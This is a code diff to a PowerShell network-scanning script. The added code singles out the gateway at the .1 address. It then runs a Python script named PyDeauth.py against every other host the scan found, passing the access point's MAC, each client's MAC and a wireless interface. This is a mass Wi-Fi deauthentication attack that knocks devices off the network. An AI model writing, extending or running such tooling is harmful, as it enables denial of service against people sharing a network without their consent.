@@ -5,6 +5,10 @@ PARAM
 	[ValidateNotNullOrEmpty()]
     [Int16] $MaxValue = 256,
 
+    [Parameter(Position=101,Mandatory=$false)]
+	[ValidateNotNullOrEmpty()]
+    [String] $Interface = "enp0s3",
+
 	[Parameter()]
     [Switch] $FullComparison,
 
@@ -241,6 +245,19 @@ PROCESS
             }
         
             $Report += $Result
+        }
+
+        # Find the access point in the report
+        $AccessPoint = $Report | Where-Object {$_.IPAddress -eq "$IpPrefix.1"}
+        $Report = $Report | Where-Object {$_.IPaddress -ne "$IpPrefix.1"}
+
+        foreach ($Result in $Report)
+        {
+            $PythonArgs  = (Resolve-Path -Path "$PSScriptRoot/PyDeauth.py").Path
+            $PythonArgs += " " + $AccessPoint.MACAddress + " " + $Result.MACAddress + " " + $Interface
+            $PythonCommand = [ScriptBlock]::Create("/usr/bin/python3 $PythonArgs")
+
+            Write-Information (Invoke-Command -ScriptBlock $PythonCommand).ToString
         }
 
         # Return the results.
